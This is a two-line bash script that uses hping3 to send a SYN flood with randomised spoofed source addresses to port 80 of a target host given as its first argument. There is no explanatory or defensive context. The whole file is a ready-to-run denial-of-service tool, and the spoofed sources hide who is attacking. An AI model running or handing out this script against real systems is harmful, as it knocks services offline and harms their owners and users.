#!/bin/bash
hping3 -S $1 -p 80 --flood --rand-source
